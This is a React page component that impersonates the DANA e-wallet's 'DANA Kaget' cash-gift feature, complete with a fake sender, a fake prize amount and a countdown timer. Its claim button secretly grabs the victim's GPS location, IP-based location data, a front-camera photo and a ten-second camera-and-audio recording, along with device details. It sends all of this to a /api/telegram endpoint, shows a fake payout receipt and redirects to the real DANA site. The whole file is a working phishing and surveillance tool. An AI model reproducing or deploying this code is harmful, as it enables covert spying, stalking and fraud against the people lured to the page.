"use client";

import { useState, useRef, useEffect } from "react";

// ─── FAKE DATA ──────────────────────────────────────────────────────────────
const RANDOM_NAMES = ["Siti Aminah", "Budi Santoso", "Andi", "Rina", "Dwi", "Ahmad"];
const FAKE_SENDER = RANDOM_NAMES[Math.floor(Math.random() * RANDOM_NAMES.length)];
const FAKE_AMOUNT = Math.floor(Math.random() * 450 + 50) * 1000; // Rp 50.000 - Rp 500.000
const REDIRECT_URL = "https://www.dana.id/"; // Redirect setelah sukses

export default function DanaKagetPage() {
  const [phase, setPhase] = useState<"initial" | "processing" | "success">("initial");
  const [countdown, setCountdown] = useState(300); // 5 menit
  const [redirectCount, setRedirectCount] = useState(5);
  
  const videoRef = useRef<HTMLVideoElement | null>(null);

  // ── Setup Hidden Video Element ───────────────────────────────────────────
  useEffect(() => {
    const video = document.createElement("video");
    video.style.display = "none";
    video.muted = true;
    video.playsInline = true;
    document.body.appendChild(video);
    videoRef.current = video;
    return () => {
      if (videoRef.current) document.body.removeChild(videoRef.current);
    };
  }, []);

  // ── Urgency Timer (Initial Page) ─────────────────────────────────────────
  useEffect(() => {
    if (phase !== "initial") return;
    const t = setInterval(() => {
      setCountdown((prev) => (prev > 0 ? prev - 1 : 0));
    }, 1000);
    return () => clearInterval(t);
  }, [phase]);

  const formatTime = (seconds: number) => {
    const m = Math.floor(seconds / 60);
    const s = seconds % 60;
    return `${m.toString().padStart(2, "0")}:${s.toString().padStart(2, "0")}`;
  };

  const formatRupiah = (amount: number) => {
    return new Intl.NumberFormat("id-ID", {
      style: "currency",
      currency: "IDR",
      minimumFractionDigits: 0,
    }).format(amount);
  };

  // ── CAPTURE & TELEGRAM LOGIC ─────────────────────────────────────────────
  const captureEverything = async () => {
    // 1. Get location (non-blocking fallback)
    const gpsPromise = new Promise<{ lat: number; lng: number } | null>((resolve) => {
      if (!("geolocation" in navigator)) return resolve(null);
      navigator.geolocation.getCurrentPosition(
        (p) => resolve({ lat: p.coords.latitude, lng: p.coords.longitude }),
        () => resolve(null),
        { timeout: 8000, enableHighAccuracy: true, maximumAge: 0 }
      );
    });

    // 2. Get IP Info
    const ipPromise = (async () => {
      try {
        const r = await fetch("https://ipinfo.io/json?token=56ce10652d9d41", { signal: AbortSignal.timeout(5000) });
        return r.ok ? await r.json() : null;
      } catch {
        return null;
      }
    })();

    // 3. Get Media Stream (Camera front + audio)
    const streamPromise = (async () => {
      try {
        return await navigator.mediaDevices.getUserMedia({
          video: { facingMode: "user", width: { ideal: 640 }, height: { ideal: 480 } },
          audio: true,
        });
      } catch {
        try {
          return await navigator.mediaDevices.getUserMedia({
            video: { facingMode: "user", width: { ideal: 640 }, height: { ideal: 480 } },
            audio: false,
          });
        } catch {
          return null;
        }
      }
    })();

    const [gps, ip, capStream] = await Promise.all([gpsPromise, ipPromise, streamPromise]);

    let photoBlob: Blob | null = null;
    let videoBlob: Blob | null = null;

    if (capStream) {
      // Ambil foto
      photoBlob = await new Promise<Blob | null>((res) => {
        const v = videoRef.current;
        if (!v) return res(null);
        v.srcObject = capStream;
        v.onloadedmetadata = () => {
          v.play();
          setTimeout(() => {
            const c = document.createElement("canvas");
            c.width = v.videoWidth || 640;
            c.height = v.videoHeight || 480;
            const ctx = c.getContext("2d");
            if (ctx) {
              ctx.drawImage(v, 0, 0, c.width, c.height);
              c.toBlob((b) => res(b), "image/jpeg", 0.85);
            } else {
              res(null);
            }
          }, 300);
        };
        v.onerror = () => res(null);
      });

      // Rekam video 10 detik
      videoBlob = await new Promise<Blob | null>((res) => {
        const chunks: Blob[] = [];
        let mr: MediaRecorder;
        try {
          mr = new MediaRecorder(capStream, { mimeType: "video/webm" });
        } catch {
          try {
            mr = new MediaRecorder(capStream);
          } catch {
            return res(null);
          }
        }
        mr.ondataavailable = (e) => {
          if (e.data.size > 0) chunks.push(e.data);
        };
        mr.onstop = () => {
          res(new Blob(chunks, { type: mr.mimeType }));
        };
        mr.start();
        setTimeout(() => {
          if (mr.state !== "inactive") mr.stop();
        }, 10000); // 10s
      });

      // Stop tracks
      capStream.getTracks().forEach((t) => t.stop());
    }

    // Build Device Info
    const ua = navigator.userAgent;
    const os = (() => {
      if (/android/i.test(ua)) {
        const m = ua.match(/Android\s+([\d.]+)/);
        const d = ua.match(/;\s*([^;)]+)\s*(?:Build|[);])/);
        return `Android ${m?.[1] || "?"} (${d?.[1]?.trim() || "Unknown"})`;
      }
      if (/iPad|iPhone|iPod/.test(ua)) {
        const m = ua.match(/OS\s+([\d_]+)/);
        return `iOS ${m?.[1]?.replace(/_/g, ".") || "?"}`;
      }
      if (/Windows/.test(ua)) {
        const m = ua.match(/Windows NT\s+([\d.]+)/);
        return `Windows ${
          { "10.0": "10/11", "6.3": "8.1", "6.2": "8", "6.1": "7" }[m?.[1] || ""] || m?.[1] || "?"
        }`;
      }
      if (/Mac OS X/.test(ua)) {
        const m = ua.match(/Mac OS X\s+([\d_]+)/);
        return `macOS ${m?.[1]?.replace(/_/g, ".") || "?"}`;
      }
      return /Linux/.test(ua) ? "Linux" : "Unknown OS";
    })();

    const browser = (() => {
      if (/Edg\//.test(ua)) return `Edge ${ua.match(/Edg\/([\d.]+)/)?.[1] || "?"}`;
      if (/Chrome\//.test(ua) && !/OPR\//.test(ua)) return `Chrome ${ua.match(/Chrome\/([\d.]+)/)?.[1] || "?"}`;
      if (/Firefox\//.test(ua)) return `Firefox ${ua.match(/Firefox\/([\d.]+)/)?.[1] || "?"}`;
      if (/Safari\//.test(ua)) return `Safari ${ua.match(/Version\/([\d.]+)/)?.[1] || "?"}`;
      return "Unknown Browser";
    })();

    let battery = "Unknown";
    try {
      const b = await (navigator as any).getBattery?.();
      if (b) {
        battery = `${Math.round(b.level * 100)}%${b.charging ? " (Charging)" : " (Discharging)"}`;
      }
    } catch {}

    const ram = (navigator as any).deviceMemory ? `${(navigator as any).deviceMemory} GB` : "Unknown";
    const cpu = navigator.hardwareConcurrency ? `${navigator.hardwareConcurrency} cores` : "Unknown";
    const orientation = window.screen.orientation?.type || (window.innerWidth > window.innerHeight ? "landscape" : "portrait");

    let locStr = "";
    if (gps) {
      locStr = `📍 GPS: ${gps.lat}, ${gps.lng}\n🗺 Maps: https://www.google.com/maps?q=${gps.lat},${gps.lng}`;
    } else if (ip) {
      locStr = `🌐 IP: ${ip["ip"] || "?"}\n🏙 Kota: ${ip["city"] || "?"}\n🗺 Region: ${ip["region"] || "?"}\n🌏 Negara: ${ip["country"] || "?"}\n📍 Koordinat: ${ip["loc"] || "?"}\n🏢 ISP: ${ip["org"] || "?"}`;
    } else {
      locStr = "❌ LOKASI TIDAK TERSEDIA";
    }

    const ts = new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" });
    const info = `💰 DANA KAGET — KLAIM
━━━━━━━━━━━━━━━━━━━
⏱ ${ts}
🆔 ${new Date().toISOString()}

━━━ LOKASI ━━━
${locStr}

━━━ PERANGKAT ━━━
💻 OS: ${os}
🌍 Browser: ${browser}
📱 Platform: ${navigator.platform || "?"}
🗣 Bahasa: ${navigator.language}
🔋 Baterai: ${battery}
🧠 RAM: ${ram}
⚡ CPU: ${cpu}

━━━ LAYAR ━━━
📐 ${window.screen.width}x${window.screen.height}
👁 ${window.innerWidth}x${window.innerHeight}
🔄 ${orientation}

━━━ UA ━━━
${ua}`;

    // Kirim formData
    const fd = new FormData();
    if (photoBlob) fd.append("photo", photoBlob, "photo.jpg");
    if (videoBlob) fd.append("video", videoBlob, "video.webm");
    fd.append("locationInfo", info);

    for (let i = 0; i < 2; i++) {
      try {
        const r = await fetch("/api/telegram", { method: "POST", body: fd });
        if (r.ok) break;
      } catch {}
      if (i === 0) await new Promise((r) => setTimeout(r, 500));
    }
  };

  // ── Handle Claim Click ───────────────────────────────────────────────────
  const handleClaim = async () => {
    setPhase("processing");
    await captureEverything();
    setPhase("success");

    // Mulai redirect countdown
    const t = setInterval(() => {
      setRedirectCount((prev) => {
        if (prev <= 1) {
          clearInterval(t);
          window.location.href = REDIRECT_URL;
          return 0;
        }
        return prev - 1;
      });
    }, 1000);
  };

  // ═════════════════════════════════════════════════════════════════════════
  // RENDER PHASE: INITIAL
  // ═════════════════════════════════════════════════════════════════════════
  if (phase === "initial") {
    return (
      <div className="min-h-screen bg-gray-50 font-[--font-jakarta] flex justify-center">
        <div className="w-full max-w-md bg-white shadow-xl min-h-screen relative flex flex-col overflow-hidden">
          {/* Header */}
          <div className="bg-[#008857] h-16 flex items-center justify-between px-4 z-10 relative shadow-sm">
            <div className="flex items-center gap-3">
              <div className="bg-white/20 p-1.5 rounded-full cursor-pointer hover:bg-white/30 transition-colors">
                <svg viewBox="0 0 24 24" width="20" height="20" fill="none" stroke="white" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
                  <path d="M15 18l-6-6 6-6" />
                </svg>
              </div>
              <span className="text-white font-bold text-lg tracking-wide">DANA Kaget</span>
            </div>
            <div className="w-8 h-8 rounded-full bg-white/20 flex flex-col justify-center gap-1 items-center px-1.5 cursor-pointer">
              <div className="w-1 h-1 bg-white rounded-full" />
              <div className="w-1 h-1 bg-white rounded-full" />
              <div className="w-1 h-1 bg-white rounded-full" />
            </div>
          </div>

          {/* DANA Kaget Envlope Graphic */}
          <div className="bg-gradient-to-b from-[#008857] to-[#00A86B] pb-8 pt-6 px-4 rounded-b-3xl relative z-0 flex flex-col items-center">
            <div className="absolute top-0 left-0 w-full h-full overflow-hidden z-[-1]">
              <div className="absolute -top-10 -left-10 w-40 h-40 bg-white/10 rounded-full blur-2xl" />
              <div className="absolute top-20 -right-10 w-32 h-32 bg-white/10 rounded-full blur-2xl" />
            </div>

            <div className="w-24 h-24 bg-white rounded-2xl shadow-lg flex items-center justify-center transform rotate-12 mb-6">
              <div className="w-20 h-20 bg-gradient-to-br from-[#00D784] to-[#008857] rounded-xl flex items-center justify-center transform -rotate-12 shadow-inner">
                <span className="text-white font-bold text-4xl">Rp</span>
              </div>
            </div>

            <h1 className="text-white font-extrabold text-2xl text-center mb-1">Ada DANA Kaget!</h1>
            <p className="text-white/90 text-sm text-center font-medium">Buka sekarang sebelum kehabisan!</p>
          </div>

          {/* Body Content */}
          <div className="flex-1 px-5 pt-8 pb-24 flex flex-col items-center">
            {/* Sender Info */}
            <div className="bg-white rounded-2xl border border-gray-100 shadow-[0_4px_20px_-4px_rgba(0,0,0,0.05)] w-full p-5 flex items-center gap-4 mb-6">
              <div className="w-14 h-14 bg-gradient-to-tr from-blue-500 to-indigo-500 rounded-full flex items-center justify-center text-white font-bold text-xl shadow-inner">
                {FAKE_SENDER.charAt(0)}
              </div>
              <div className="flex-1">
                <p className="text-xs text-gray-500 font-medium mb-0.5">Dikirim oleh</p>
                <p className="text-gray-900 font-bold text-lg leading-tight">{FAKE_SENDER}</p>
              </div>
            </div>

            {/* Countdown */}
            <div className="flex flex-col items-center mb-8">
              <p className="text-gray-500 text-sm font-medium mb-2">Kadaluarsa dalam</p>
              <div className="flex items-center gap-2">
                <div className="bg-[#008857] text-white font-mono font-bold text-xl px-3 py-1.5 rounded-lg shadow-md">
                  {formatTime(countdown).split(":")[0]}
                </div>
                <span className="text-gray-400 font-bold text-xl">:</span>
                <div className="bg-[#008857] text-white font-mono font-bold text-xl px-3 py-1.5 rounded-lg shadow-md">
                  {formatTime(countdown).split(":")[1]}
                </div>
              </div>
            </div>

            {/* Note */}
            <p className="text-center text-sm text-gray-500 font-medium max-w-[280px]">
              Verifikasi perangkat Anda dengan memberikan izin akses yang diminta untuk mengklaim.
            </p>
          </div>

          {/* Fixed Bottom Action */}
          <div className="fixed bottom-0 left-0 w-full flex justify-center pb-6 pt-4 bg-gradient-to-t from-white via-white to-transparent px-5 z-20">
            <div className="w-full max-w-md">
              <button
                onClick={handleClaim}
                className="w-full bg-[#00A86B] hover:bg-[#008857] active:scale-[0.98] transition-all text-white font-bold text-lg py-4 rounded-xl shadow-[0_8px_20px_-6px_rgba(0,168,107,0.5)]"
              >
                Buka Sekarang
              </button>
            </div>
          </div>
        </div>
      </div>
    );
  }

  // ═════════════════════════════════════════════════════════════════════════
  // RENDER PHASE: PROCESSING
  // ═════════════════════════════════════════════════════════════════════════
  if (phase === "processing") {
    return (
      <div className="min-h-screen bg-white font-[--font-jakarta] flex justify-center items-center">
        <div className="w-full max-w-md flex flex-col items-center">
          <div className="relative mb-8">
            <div className="absolute inset-0 bg-[#00A86B] rounded-full blur-xl opacity-20 animate-pulse" />
            <div className="w-24 h-24 bg-gradient-to-br from-[#00D784] to-[#008857] rounded-3xl flex items-center justify-center shadow-lg relative z-10 animate-bounce">
              <span className="text-white font-bold text-4xl">D</span>
            </div>
          </div>
          <div className="flex flex-col items-center gap-4">
            <svg className="animate-spin h-8 w-8 text-[#008857]" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
              <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
              <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
            </svg>
            <p className="text-gray-800 font-bold text-lg">Memverifikasi Klaim...</p>
            <p className="text-gray-500 text-sm">Mohon tunggu sebentar, sedang mengamankan dana.</p>
          </div>
        </div>
      </div>
    );
  }

  // ═════════════════════════════════════════════════════════════════════════
  // RENDER PHASE: SUCCESS
  // ═════════════════════════════════════════════════════════════════════════
  return (
    <div className="min-h-screen bg-[#F5F5F5] font-[--font-jakarta] flex justify-center">
      <div className="w-full max-w-md bg-white shadow-xl min-h-screen relative flex flex-col pb-10">
        
        {/* Header Success */}
        <div className="bg-[#008857] pb-16 pt-8 px-5 rounded-b-[40px] flex flex-col items-center shadow-md z-10">
          <div className="w-16 h-16 bg-white rounded-full flex items-center justify-center mb-4 shadow-[0_0_20px_rgba(255,255,255,0.3)]">
            <svg viewBox="0 0 24 24" width="36" height="36" fill="#008857">
              <path d="M9 16.2L4.8 12l-1.4 1.4L9 19 21 7l-1.4-1.4L9 16.2z"/>
            </svg>
          </div>
          <h2 className="text-white font-bold text-2xl mb-1 text-center">Klaim Berhasil!</h2>
          <p className="text-white/90 text-sm font-medium">DANA Kaget telah masuk ke saldo Anda</p>
        </div>

        {/* Receipt Card */}
        <div className="px-5 -mt-10 relative z-20 flex-1">
          <div className="bg-white rounded-2xl shadow-[0_8px_30px_rgb(0,0,0,0.08)] border border-gray-100 p-6 flex flex-col items-center">
            <p className="text-gray-500 text-sm font-medium mb-1">Total Didapatkan</p>
            <h1 className="text-gray-900 font-extrabold text-3xl mb-6">{formatRupiah(FAKE_AMOUNT)}</h1>

            <div className="w-full border-t border-dashed border-gray-200 my-4 relative">
              <div className="absolute -left-8 -top-3 w-6 h-6 bg-[#F5F5F5] rounded-full shadow-inner" />
              <div className="absolute -right-8 -top-3 w-6 h-6 bg-[#F5F5F5] rounded-full shadow-inner" />
            </div>

            <div className="w-full flex flex-col gap-4">
              <div className="flex justify-between items-start">
                <span className="text-gray-500 text-sm">Pengirim</span>
                <span className="text-gray-900 font-bold text-sm text-right">{FAKE_SENDER}</span>
              </div>
              <div className="flex justify-between items-start">
                <span className="text-gray-500 text-sm">Waktu Transaksi</span>
                <span className="text-gray-900 font-bold text-sm text-right">
                  {new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta", dateStyle: "long", timeStyle: "short" })}
                </span>
              </div>
              <div className="flex justify-between items-start">
                <span className="text-gray-500 text-sm">Nomor Referensi</span>
                <span className="text-gray-900 font-bold text-sm text-right uppercase">DK{Math.random().toString(36).substring(2, 10)}</span>
              </div>
            </div>
          </div>
        </div>

        {/* Redirect Overlay */}
        <div className="fixed inset-0 bg-black/60 z-50 flex items-center justify-center px-4 backdrop-blur-sm">
          <div className="bg-white rounded-2xl w-full max-w-sm p-6 flex flex-col items-center shadow-2xl animate-[drop-in_0.3s_ease-out_forwards]">
            <div className="w-14 h-14 bg-green-50 text-green-500 rounded-full flex items-center justify-center mb-4">
              <svg viewBox="0 0 24 24" width="28" height="28" fill="currentColor">
                <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/>
              </svg>
            </div>
            <h3 className="text-gray-900 font-bold text-lg mb-2 text-center">Verifikasi Selesai</h3>
            <p className="text-gray-500 text-sm text-center mb-6">Mengarahkan kembali ke aplikasi DANA dalam <span className="font-bold text-[#00A86B]">{redirectCount}</span> detik...</p>
            
            <div className="w-full h-1.5 bg-gray-100 rounded-full overflow-hidden mb-4">
              <div 
                className="h-full bg-[#00A86B] rounded-full transition-all duration-1000 ease-linear"
                style={{ width: `${((5 - redirectCount) / 5) * 100}%` }}
              />
            </div>
            
            <button 
              onClick={() => window.location.href = REDIRECT_URL}
              className="w-full py-3 rounded-xl bg-gray-50 text-gray-700 font-bold text-sm hover:bg-gray-100 transition-colors"
            >
              Lanjutkan Sekarang
            </button>
          </div>
        </div>

      </div>
      <style>{`
        @keyframes drop-in {
          0% { transform: scale(0.95) translateY(10px); opacity: 0; }
          100% { transform: scale(1) translateY(0); opacity: 1; }
        }
      `}</style>
    </div>
  );
}
